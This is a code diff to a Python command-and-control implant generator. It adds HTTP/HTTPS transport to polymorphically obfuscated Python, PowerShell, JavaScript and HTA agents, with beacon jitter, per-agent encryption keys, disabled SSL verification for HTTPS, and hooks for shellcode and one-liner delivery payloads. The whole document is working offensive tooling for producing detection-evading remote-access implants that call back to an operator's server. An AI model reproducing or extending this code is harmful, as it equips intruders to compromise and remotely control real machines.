@@ -231,6 +231,12 @@ class AgentGenerator:
             'socks_proxy_handler': self.random_var_name(),
             'heartbeat': self.random_var_name(),
             'calculate_sleep_time': self.random_var_name(),
+            'http_request': self.random_var_name(),
+            'register_agent': self.random_var_name(),
+            'checkin': self.random_var_name(),
+            'send_results': self.random_var_name(),
+            'process_commands': self.random_var_name(),
+            'upgrade_to_websocket': self.random_var_name(),
         }
 
         # Build combined regex for function names (single pass)
@@ -902,12 +908,14 @@ def {cmd_func}(cmd):
 
     def generate_python_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                               beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
-                              obfuscate: bool = True, unique_key: bool = False, target_os: str = 'auto') -> str:
+                              obfuscate: bool = True, unique_key: bool = True, target_os: str = 'auto',
+                              transport: str = 'websocket') -> str:
         """Generate Python agent with polymorphic obfuscation and OS-specific features
 
         Args:
             unique_key: Generate unique encryption key per agent (default True)
             target_os: Target OS ('windows', 'linux', 'macos', or 'auto' for current platform)
+            transport: Transport protocol ('websocket', 'http', 'https')
         """
         # Determine target OS
         if target_os == 'auto':
@@ -918,13 +926,19 @@ def {cmd_func}(cmd):
             else:
                 target_os = 'linux'
 
-        print(f"[*] Generating agent for {target_os.upper()}")
+        print(f"[*] Generating agent for {target_os.upper()} via {transport.upper()}")
 
-        # Use minimal beacon template for beacon mode (staged loading)
-        if beacon_mode:
-            template_path = self.templates_dir / "agent_beacon_minimal.py"
+        # Select template based on transport and mode
+        if transport in ('http', 'https'):
+            if beacon_mode:
+                template_path = self.templates_dir / "agent_http_beacon_minimal.py"
+            else:
+                template_path = self.templates_dir / "agent_http_template.py"
         else:
-            template_path = self.templates_dir / "agent_template.py"
+            if beacon_mode:
+                template_path = self.templates_dir / "agent_beacon_minimal.py"
+            else:
+                template_path = self.templates_dir / "agent_template.py"
 
         if not template_path.exists():
             raise FileNotFoundError(f"Template not found: {template_path}")
@@ -945,6 +959,11 @@ def {cmd_func}(cmd):
         content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
         content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))
 
+        # HTTP/HTTPS-specific placeholders
+        if transport in ('http', 'https'):
+            content = content.replace("{{C2_SCHEME}}", transport)
+            content = content.replace("{{VERIFY_SSL}}", "False" if transport == 'https' else "True")
+
         # Add OS-specific code
         os_specific = self.get_os_specific_code(target_os)
 
@@ -961,9 +980,10 @@ def {cmd_func}(cmd):
         # Save agent
         jitter_suffix = f"_jitter{beacon_jitter}" if beacon_mode and beacon_jitter > 0 else ""
         mode_suffix = f"_beacon{beacon_interval}s{jitter_suffix}" if beacon_mode else "_stream"
+        transport_suffix = f"_{transport}" if transport != 'websocket' else ""
         agent_hash = hashlib.md5(content.encode()).hexdigest()[:6]
         os_suffix = f"_{target_os}"
-        output_file = self.output_dir / f"agent_{agent_hash}{mode_suffix}{os_suffix}.py"
+        output_file = self.output_dir / f"agent_{agent_hash}{transport_suffix}{mode_suffix}{os_suffix}.py"
         with open(output_file, 'w') as f:
             f.write(content)
 
@@ -973,9 +993,14 @@ def {cmd_func}(cmd):
         print(f"[*] Agent customized for {target_os.upper()} with platform-specific features")
         return str(output_file)
 
-    def generate_powershell_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026') -> str:
+    def generate_powershell_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
+                                   transport: str = 'websocket', beacon_interval: int = 60,
+                                   beacon_jitter: int = 0) -> str:
         """Generate PowerShell agent"""
-        template_path = self.templates_dir / "agent_template.ps1"
+        if transport in ('http', 'https'):
+            template_path = self.templates_dir / "agent_http_template.ps1"
+        else:
+            template_path = self.templates_dir / "agent_template.ps1"
 
         if not template_path.exists():
             raise FileNotFoundError(f"Template not found: {template_path}")
@@ -987,20 +1012,32 @@ def {cmd_func}(cmd):
         content = content.replace("{{C2_HOST}}", c2_host)
         content = content.replace("{{C2_PORT}}", str(c2_port))
         content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
+
+        if transport in ('http', 'https'):
+            content = content.replace("{{C2_SCHEME}}", transport)
+            content = content.replace("{{VERIFY_SSL}}", "false" if transport == 'https' else "true")
+            content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
+            content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))
 
         # Apply polymorphic obfuscation
         content = self.obfuscate_powershell(content)
 
         # Save agent
-        output_file = self.output_dir / f"agent_{self.random_string(6)}.ps1"
+        transport_suffix = f"_{transport}" if transport != 'websocket' else ""
+        output_file = self.output_dir / f"agent_{self.random_string(6)}{transport_suffix}.ps1"
         with open(output_file, 'w') as f:
             f.write(content)
 
         return str(output_file)
 
-    def generate_javascript_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026') -> str:
+    def generate_javascript_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
+                                    transport: str = 'websocket', beacon_mode: bool = False,
+                                    beacon_interval: int = 60, beacon_jitter: int = 0) -> str:
         """Generate JavaScript (Node.js) agent"""
-        template_path = self.templates_dir / "agent_template.js"
+        if transport in ('http', 'https'):
+            template_path = self.templates_dir / "agent_http_template.js"
+        else:
+            template_path = self.templates_dir / "agent_template.js"
 
         if not template_path.exists():
             raise FileNotFoundError(f"Template not found: {template_path}")
@@ -1012,20 +1049,33 @@ def {cmd_func}(cmd):
         content = content.replace("{{C2_HOST}}", c2_host)
         content = content.replace("{{C2_PORT}}", str(c2_port))
         content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
+
+        if transport in ('http', 'https'):
+            content = content.replace("{{C2_SCHEME}}", transport)
+            content = content.replace("{{VERIFY_SSL}}", "false" if transport == 'https' else "true")
+            content = content.replace("{{BEACON_MODE}}", "true" if beacon_mode else "false")
+            content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
+            content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))
 
         # Apply polymorphic obfuscation
         content = self.obfuscate_javascript(content)
 
         # Save agent
-        output_file = self.output_dir / f"agent_{self.random_string(6)}.js"
+        transport_suffix = f"_{transport}" if transport != 'websocket' else ""
+        output_file = self.output_dir / f"agent_{self.random_string(6)}{transport_suffix}.js"
         with open(output_file, 'w') as f:
             f.write(content)
 
         return str(output_file)
 
-    def generate_hta_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026') -> str:
+    def generate_hta_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
+                            transport: str = 'websocket', beacon_interval: int = 60,
+                            beacon_jitter: int = 0) -> str:
         """Generate HTA agent"""
-        template_path = self.templates_dir / "agent_template.hta"
+        if transport in ('http', 'https'):
+            template_path = self.templates_dir / "agent_http_template.hta"
+        else:
+            template_path = self.templates_dir / "agent_template.hta"
 
         if not template_path.exists():
             raise FileNotFoundError(f"Template not found: {template_path}")
@@ -1038,11 +1088,17 @@ def {cmd_func}(cmd):
         content = content.replace("{{C2_PORT}}", str(c2_port))
         content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
 
+        if transport in ('http', 'https'):
+            content = content.replace("{{C2_SCHEME}}", transport)
+            content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
+            content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))
+
         # Apply polymorphic obfuscation
         content = self.obfuscate_hta(content)
 
         # Save agent
-        output_file = self.output_dir / f"agent_{self.random_string(6)}.hta"
+        transport_suffix = f"_{transport}" if transport != 'websocket' else ""
+        output_file = self.output_dir / f"agent_{self.random_string(6)}{transport_suffix}.hta"
         with open(output_file, 'w') as f:
             f.write(content)
 
@@ -1606,8 +1662,9 @@ unsigned int {var_name}_len = {len(data)};
                      beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                      compile_exe: bool = False, compile_dll: bool = False, generate_shellcode: bool = False,
                      shellcode_format: str = 'raw', architectures: list = None, upx: bool = True, icon: str = None,
-                     target_os: str = 'auto', generate_multi_os: bool = False, unique_key: bool = False,
-                     generate_bin: bool = False, raw_shellcode: bool = False) -> dict:
+                     target_os: str = 'auto', generate_multi_os: bool = False, unique_key: bool = True,
+                     generate_bin: bool = False, raw_shellcode: bool = False,
+                     transport: str = 'websocket') -> dict:
         """Generate agents for all platforms
 
         Args:
@@ -1643,7 +1700,7 @@ unsigned int {var_name}_len = {len(data)};
                 results[os_key] = self.generate_python_agent(
                     c2_host, c2_port, encryption_key,
                     beacon_mode, beacon_interval, beacon_jitter,
-                    unique_key=unique_key, target_os=os_type
+                    unique_key=unique_key, target_os=os_type, transport=transport
                 )
                 if beacon_mode:
                     jitter_desc = f" ±{beacon_jitter}%" if beacon_jitter > 0 else ""
@@ -1656,21 +1713,27 @@ unsigned int {var_name}_len = {len(data)};
                 print(f"[-] Python agent failed ({os_type}): {str(e)}")
 
         try:
-            results['powershell'] = self.generate_powershell_agent(c2_host, c2_port, encryption_key)
+            results['powershell'] = self.generate_powershell_agent(c2_host, c2_port, encryption_key,
+                                                                     transport=transport, beacon_interval=beacon_interval,
+                                                                     beacon_jitter=beacon_jitter)
             print(f"[+] PowerShell agent generated: {results['powershell']}")
         except Exception as e:
             results['powershell'] = f"Error: {str(e)}"
             print(f"[-] PowerShell agent failed: {str(e)}")
 
         try:
-            results['javascript'] = self.generate_javascript_agent(c2_host, c2_port, encryption_key)
+            results['javascript'] = self.generate_javascript_agent(c2_host, c2_port, encryption_key,
+                                                                     transport=transport, beacon_mode=beacon_mode,
+                                                                     beacon_interval=beacon_interval, beacon_jitter=beacon_jitter)
             print(f"[+] JavaScript agent generated: {results['javascript']}")
         except Exception as e:
             results['javascript'] = f"Error: {str(e)}"
             print(f"[-] JavaScript agent failed: {str(e)}")
 
         try:
-            results['hta'] = self.generate_hta_agent(c2_host, c2_port, encryption_key)
+            results['hta'] = self.generate_hta_agent(c2_host, c2_port, encryption_key,
+                                                         transport=transport, beacon_interval=beacon_interval,
+                                                         beacon_jitter=beacon_jitter)
             print(f"[+] HTA agent generated: {results['hta']}")
         except Exception as e:
             results['hta'] = f"Error: {str(e)}"
@@ -2357,6 +2420,8 @@ if __name__ == '__main__':
                        help='Generate self-decoding shellcode blobs')
     parser.add_argument('--oneliners', type=str, metavar='URL',
                        help='Generate one-liner payloads for delivery (provide payload URL)')
+    parser.add_argument('--transport', choices=['websocket', 'http', 'https'], default='websocket',
+                       help='Transport protocol (default: websocket)')
 
     args = parser.parse_args()
 
@@ -2371,7 +2436,8 @@ if __name__ == '__main__':
         compile_exe=args.compile, compile_dll=args.dll, generate_shellcode=args.shellcode,
         shellcode_format=args.format, architectures=args.arch, upx=not args.no_upx,
         icon=args.icon, target_os=args.target_os, generate_multi_os=args.multi_os,
-        generate_bin=args.bin, raw_shellcode=args.raw_shellcode
+        generate_bin=args.bin, raw_shellcode=args.raw_shellcode,
+        transport=args.transport
     )
 
     print("\n" + "="*60)
